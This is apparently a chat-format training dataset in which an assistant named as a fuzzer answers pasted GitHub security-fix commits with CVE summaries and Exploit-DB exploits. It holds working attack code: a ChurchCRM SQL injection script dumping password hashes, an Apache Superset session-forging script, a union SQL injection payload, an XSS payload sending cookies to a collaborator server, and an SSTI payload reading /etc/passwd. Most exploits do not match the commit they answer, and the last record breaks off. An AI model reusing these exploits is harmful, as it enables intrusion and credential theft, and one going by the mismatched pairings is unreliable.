endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School.\nThe Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping.\nThis allows the attacker to inject malicious Event payloads to execute the malicious SQL query.\n\nThis script is created as Proof of Concept to retrieve the username and password hash from user_usr table.\n\"\"\"\n\n\nimport sys, requests\n\ndef dumpUserTable(target, session_cookies):\n    print(\"(+) Retrieving username and password\")\n    print(\"\")\n    url = \"%s/EventAttendance.php?Action=List&Event=2+UNION+ALL+SELECT+1,NULL,CONCAT('Perseverance',usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+-&Type=Sunday School\" % (target)\n    headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'CRM-2c90cf299230a50dab55aee824ed9b08='+str(session_cookies)}\n    r = requests.get(url, headers=headers)\n    lines = r.text.splitlines()\n\n    for line in lines:\n        if \"<td >Perseverance\" in line:\n            print(line.split(\"Perseverance\")[1].split(\"</td>\")[0])\n\ndef login(target, username, password):\n    target = \"%s/session/begin\" % (target)\n    headers = {'Content-Type': 'application/x-www-form-urlencoded'}\n    data = \"User=%s&Password=%s\" % (username, password)\n    s = requests.session()\n    r = s.post(target, data = data, headers = headers)\n    return s.cookies.get('CRM-2c90cf299230a50dab55aee824ed9b08')\n\ndef main():\n    print(\"(!) Login to the target application\")\n    session_cookies = login(target, username, password)\n\n    print(\"(!) Exploiting the Auth SQL Injection to retrieve the username and password hash\")\n    dumpUserTable(target, session_cookies)\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 4:\n        print(\"(!) Usage: python3 exploit.py <URL> <username> <password>\")\n        print(\"(!) E.g.,: python3 exploit.py http://192.168.1.100/ChurchCRM user pass\")\n        sys.exit(-1)\n\n    target = sys.argv[1]\n    username = sys.argv[2]\n    password = sys.argv[3]\n\n    main()\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/thorsten/phpmyfaq/commit/e7599d49b0ece7ceef3a4e8d334782cc3df98be8\nfix: cleanup content before sending it to the user · thorsten/phpMyFAQ@e7599d4 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        thorsten\n \n/\n\nphpMyFAQ\n\nPublic\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    252\n \n          Star\n 581\n  \nCode\n\nIssues\n17\nPull requests\n0\nDiscussions\n\nActions\n\nProjects\n1\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          fix: cleanup content before sending it to the user\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \nthorsten\n    \n  committed\n  Apr 11, 2023\n\n        1 parent\n          \n          6ed70ee\n\ncommit e7599d4\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      3 changed files\n      with\n      33 additions\n      and\n      0 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        phpmyfaq\n      \n\nphpmyfaq/faq.php\n\n        faq.php\n      \n        src/phpMyFAQ/Helper\n      \n\nphpmyfaq/src/phpMyFAQ/Helper/FaqHelper.php\n\n        FaqHelper.php\n      \n        tests/phpMyFAQ/Helper\n      \n\ntests/phpMyFAQ/Helper/FaqHelperTest.php\n\n        FaqHelperTest.php\n      \n\n \n        There are no files selected for viewing\n\n \n\n            2 changes: 2 additions & 0 deletions\n          \n2 \n\nphpmyfaq/faq.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -105,6 +105,8 @@\n\n $answer = $faqHelper->renderMarkupContent($faq->faqRecord['content']);\n\n}\n\n$answer = $faqHelper->cleanUpContent($answer);\n\n// Rewrite URL fragments\n\n$currentUrl = htmlspecialchars(\"//{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}\", ENT_QUOTES, 'UTF-8');\n\n$answer = $faqHelper->rewriteUrlFragments($answer, $currentUrl);\nExpand Down\n            21 changes: 21 additions & 0 deletions\n          \n21 \n\nphpmyfaq/src/phpMyFAQ/Helper/FaqHelper.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -17,6 +17,7 @@\n\nnamespace phpMyFAQ\\Helper;\n\nuse DOMDocument;\n\nuse Exception;\n\nuse ParsedownExtra;\n\nuse phpMyFAQ\\Category;\nExpand Down\n\nExpand Up\n\n@@ -226,4 +227,24 @@ public function createFaqUrl(FaqEntity $faqEntity, int $categoryId): string\n\n $faqEntity->getLanguage()\n\n        );\n\n    }\n\n /**\n\n     * Remove <script> tags, we don't need them\n\n     *\n\n     * @param string $content\n\n     * @return string\n\n     */\n\n public function cleanUpContent(string $content): string\n\n    {\n\n $document = new DOMDocument();\n\n $document->loadHTML($content, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);\n\n $scriptTags = $document->getElementsByTagName('script');\n\n        for ($i = 0; $i < $scriptTags->length; $i++) {\n\n $scriptTags->item($i)->parentNode->removeChild($scriptTags->item($i));\n\n        }\n\n return preg_replace(['/\\r/', '/\\n/'], '', $document->saveHTML());\n\n    }\n\n}\n            10 changes: 10 additions & 0 deletions\n          \n10 \n\ntests/phpMyFAQ/Helper/FaqHelperTest.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -59,4 +59,14 @@ public function testCreateFaqUrl(): void\n\n $this->faqHelper->createFaqUrl($faqEntity, 1)\n\n        );\n\n    }\n\n public function testCleanUpContent(): void\n\n    {\n\n $content = '<p>Some text <script>alert(\"Hello, world!\");</script></p>';\n\n $expectedOutput = '<p>Some text </p>';\n\n $actualOutput = $this->faqHelper->cleanUpContent($content);\n\n $this->assertEquals($expectedOutput, $actualOutput);\n\n    }\n\n}\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit e7599d4\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross-site Scripting (XSS) - Stored in GitHub repository thorsten/phpmyfaq prior to 3.2.0-beta.\n\nexploit\n/multiple/webapps/51447.py\n# Exploit Title: Apache Superset 2.0.0 - Authentication Bypass\n# Date: 10 May 2023\n# Exploit Author: MaanVader\n# Vendor Homepage: https://superset.apache.org/\n# Version: Apache Superset<= 2.0.1\n# Tested on: 2.0.0\n# CVE: CVE-2023-27524\n\nfrom flask_unsign import session\nimport requests\nimport urllib3\nimport argparse\nimport re\nfrom time import sleep\nfrom selenium import webdriver\nfrom urllib.parse import urlparse\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n\nSECRET_KEYS = [\n    b'\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h',  # version < 1.4.1\n    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1\n    b'thisISaSECRET_1234',                            # deployment template\n    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation\n    b'TEST_NON_DEV_SECRET'                            # docker compose\n]\n\ndef main():\n\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--url', '-u', help='Base URL of Superset instance', required=True)\n    parser.add_argument('--id', help='User ID to forge session cookie for, default=1', required=False, default='1')\n    args = parser.parse_args()\n\n    try:\n        u = args.url.rstrip('/') + '/login/'\n\n        headers = {\n            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0'\n        }\n\n        resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)\n        if resp.status_code != 200:\n            print(f'Error retrieving login page at {u}, status code: {resp.status_code}')\n            return\n\n        session_cookie = None\n        for c in resp.cookies:\n            if c.name == 'session':\n                session_cookie = c.value\n                break\n\n        if not session_cookie:\n            print('Error: No session cookie found')\n            return\n\n        print(f'Got session cookie: {session_cookie}')\n\n        try:\n            decoded = session.decode(session_cookie)\n            print(f'Decoded session cookie: {decoded}')\n        except:\n            print('Error: Not a Flask session cookie')\n            return\n\n        match = re.search(r'\"version_string\": \"(.*?)&#34', resp.text)\n        if match:\n            version = match.group(1)\n        else:\n            version = 'Unknown'\n\n        print(f'Superset Version: {version}')\n\n\n        for i, k in enumerate(SECRET_KEYS):\n            cracked = session.verify(session_cookie, k)\n            if cracked:\n                break\n\n        if not cracked:\n            print('Failed to crack session cookie')\n            return\n\n        print(f'Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}')\n\n        try:\n            user_id = int(args.id)\n        except:\n            user_id = args.id\n\n        forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k)\n        print(f'Forged session cookie for user {user_id}: {forged_cookie}')\n        u1 = args.url.rstrip('/') + '/superset/welcome'\n\n        print(f\"Now visit the url: `{u1}` and replace the current session cookie with this `{forged_cookie}` and refresh the page and we will be logged in as admin to the dashboard:)\")\n\n\n\n\n    except Exception as e:\n        print(f'Unexpected error: {e}')\n\n\nif __name__ == '__main__':\n    main()\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/pimcore/pimcore/commit/e8dbc4da58ae86618bceb67ed35ce23e5e54d2ed\n[Security] Improved sanatizing of `pimcore_log` parameter (#15084) · pimcore/pimcore@e8dbc4d · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        pimcore\n \n/\n\npimcore\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1.4k\n \n          Star\n 3.2k\n  \nCode\n\nIssues\n379\nPull requests\n57\nDiscussions\n\nActions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          [Security] Improved sanatizing of pimcore_log parameter (#15084)\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\n* added some more chars to remove\n\n* Update Pimcore.php\n\nLoading branch information\n\n \nCorepex\n    \n  committed\n  May 3, 2023\n        1 parent\n          \n          a5b86f3\n\ncommit e8dbc4d\n\n      Showing\n      1 changed file\n      with\n      1 addition\n      and\n      2 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            3 changes: 1 addition & 2 deletions\n          \n3 \n\nlib/Pimcore.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -306,8 +306,7 @@ public static function initLogger()\n\n if (array_key_exists('pimcore_log', $_REQUEST) && self::inDebugMode()) {\n\n $requestLogName = date('Y-m-d_H-i-s');\n\n if (!empty($_REQUEST['pimcore_log'])) {\n\n // slashed are not allowed, replace them with hyphens\n\n $requestLogName = str_replace('/', '-', $_REQUEST['pimcore_log']);\n\n $requestLogName = str_replace(['/', '\\\\', '..'], '-', $_REQUEST['pimcore_log']);\n\n            }\n\n $requestLogFile = resolvePath(PIMCORE_LOG_DIRECTORY . '/request-' . $requestLogName . '.log');\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit e8dbc4d\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsPath Traversal: '\\..\\filename' in GitHub repository pimcore/pimcore prior to 10.5.22.\n\nexploit\n/php/webapps/51378.txt\n# Exploit Title: Bang Resto v1.0 - 'Multiple' SQL Injection\n# Date: 2023-04-02\n# Exploit Author: Rahad Chowdhury\n# Vendor Homepage:\nhttps://www.hockeycomputindo.com/2021/05/restaurant-pos-source-code-free.html\n# Software Link:\nhttps://github.com/mesinkasir/bangresto/archive/refs/heads/main.zip\n# Version: 1.0\n# Tested on: Windows 10, PHP 7.4.29, Apache 2.4.53\n# CVE: CVE-2023-29849\n\n*Affected Parameters:*\nbtnMenuItemID, itemID, itemPrice, menuID, staffID, itemPrice, itemID[],\nitemqty[], btnMenuItemID\n\n*Steps to Reproduce:*\n1. First login your staff panel.\n2. then go to \"order\" menu and Select menu then create order and intercept\nrequest data using burp suite.\nso your request data will be:\n\nPOST /bangresto/staff/displayitem.php HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)\nGecko/20100101 Firefox/111.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 194\nOrigin: http://127.0.0.1\nReferer: http://127.0.0.1/bangresto/staff/order.php\nCookie: PHPSESSID=2rqvjgkoog89i6g7dn7evdkmk5\nConnection: close\n\nbtnMenuItemID=1&qty=1\n\n3. \"btnMenuItemID\" parameter is vulnerable. Let's try to inject union based\nSQL Injection use this query \".1 union select\n1,2,3,CONCAT_WS(0x203a20,0x557365723a3a3a3a20,USER(),0x3c62723e,0x44617461626173653a3a3a3a3a20,DATABASE(),0x3c62723e,0x56657273696f6e3a3a3a3a20,VERSION())--\n-\" in \"btnMenuItemID\" parameter.\n4. Check browser you will see user, database and version informations.\n5. You could also use sqlmap to dump the whole database by saving the web request from BurpSuite\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/thorsten/phpmyfaq/commit/c120070a66e6c497c328d3b6b067eebcd8ea8493\nfix: strip tags for news on startpage · thorsten/phpMyFAQ@c120070 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        thorsten\n \n/\n\nphpMyFAQ\n\nPublic\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    252\n \n          Star\n 581\n  \nCode\n\nIssues\n17\nPull requests\n0\nDiscussions\n\nActions\n\nProjects\n1\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          fix: strip tags for news on startpage\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \nthorsten\n    \n  committed\n  May 5, 2023\n\n        1 parent\n          \n          9379139\n\ncommit c120070\n\n      Showing\n      1 changed file\n      with\n      2 additions\n      and\n      2 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            4 changes: 2 additions & 2 deletions\n          \n4 \n\nphpmyfaq/src/phpMyFAQ/News.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -87,7 +87,7 @@ public function getNews(bool $showArchive = false, bool $active = true): string\n\n Strings::htmlentities($item['header'])\n\n            );\n\n $output .= sprintf('%s', $item['content']);\n\n $output .= sprintf('%s', strip_tags($item['content']));\n\n if (strlen($item['link']) > 1) {\n\n $output .= sprintf(\nExpand All\n\n@@ -113,7 +113,7 @@ public function getNews(bool $showArchive = false, bool $active = true): string\n\n     * @param bool $forceConfLimit Force to limit in configuration\n\n     * @return array<int, array<mixed>>\n\n     */\n\n public function getLatestData($showArchive = false, $active = true, $forceConfLimit = false): array\n\n public function getLatestData(bool $showArchive = false, bool $active = true, bool $forceConfLimit = false): array\n\n    {\n\n $news = [];\n\n $counter = 0;\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit c120070\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross-site Scripting (XSS) - Stored in GitHub repository thorsten/phpmyfaq prior to 3.1.14.\n\nexploit\n/php/webapps/51417.txt\n# Exploit Title: Companymaps V8.0 - Stored Cross Site Scripting (XSS)\n# Date: 27.04.2023\n# Exploit Author: Lucas Noki (0xPrototype)\n# Vendor Homepage: https://github.com/vogtmh\n# Software Link: https://github.com/vogtmh/cmaps\n# Version: 8.0\n# Tested on: Mac, Windows, Linux\n# CVE : CVE-2023-29983\n\n*Steps to reproduce:*\n1. Clone the repository and install the application\n2. Send a maliciously crafted payload via the \"token\" parameter to the following endpoint: /rest/update/?token=\n3. The payload used is: <script>new+Image().src=`http://YOUR_COLLABORATOR_SERVER/?c=${document.cookie}`</script>\n4. Simply visiting the complete URL: http://IP/rest/update/?token=PAYLOAD is enough.\n5. Login into the admin panel and go to the auditlog under: /admin/index.php?tab=auditlog\n6. Check your collaborator server. You should have a request where the admins cookie is the value of the c parameter\n\nIn a real world case you would need to wait for the admin to log into the application and open the auditlog tab.\n\nSpecial thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/paragbagul111/CVE-2023-30145\n\nGitHub - paragbagul111/CVE-2023-30145: Camaleon CMS v2.7.0 contain a Server-Side Template  Injection (SSTI) vulnerability\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        paragbagul111\n \n/\n\nCVE-2023-30145\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    2\n \n          Star\n 6\n  \n        Camaleon CMS v2.7.0 contain a Server-Side Template Injection (SSTI) vulnerability \n      \n\n6\n          stars\n \n\n2\n          forks\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nparagbagul111/CVE-2023-30145\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History8 CommitsREADME.mdREADME.md  poc.pngpoc.png  sstiexploitation.pngsstiexploitation.png  View all filesRepository files navigationREADMEDescription:\nCamaleon CMS v2.7.0 was discovered to contain a Server-Side Template\nInjection (SSTI) vulnerability via the formats parameter.\nAffected Component:\nAll versions that are below 2.7.0\nFixed version:\nFixed Versions: 2.7.4\n\nStep to reproduce :\nDetection:\n1.open below URL:https://target.com/admin/media/upload\n2.upload any file and intercept request in formats parameter value add this payload and testi<%= 77 %>vuuvm in response it will return multiplication of 77 with below message \"File format not allowed (dqopi49vuuvm)\"\nExploitation: \n3.After that for execute command add this payload testqopi<%= File.open('/etc/passwd').read %>fdtest\n\nAttack Vector: \nThe attack vector for this vulnerability involves an attacker exploiting the unsanitized user input in the 'formats' parameter to inject malicious template directives, which can lead to Server-Side Template Injection (SSTI) attacks. The attacker can upload a file and intercept the request to modify the 'formats' parameter value with a payload that includes a template directive that executes arbitrary code. In this case, the attacker is using the 'dqopi<%= File.open('/etc/passwd').read %>fdfdsf' payload to read the contents of the '/etc/passwd' file on the server. This can allow the attacker to gain unauthorized access to sensitive information, and potentially take control of the server.\nCVE Impact Other: \nSSTI vulnerabilities are serious and can lead to a complete compromise of the application's data and functionality, and often of the server that is hosting the application. Attackers may also use the server as a platform for further attacks against other systems.\n\nVendor of Product:\nCamaleon CMS\nConfirmed on: 9 March 2023\nVendor:\nCamaleon-cms\nhttps://github.com/owen2345/camaleon-cms\nDiscoverer:\nParag Bagul\n   \nAbout\n\n        Camaleon CMS v2.7.0 contain a Server-Side Template Injection (SSTI) vulnerability \n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n6\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n2\n      forks\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCamaleon CMS v2.7.0 was 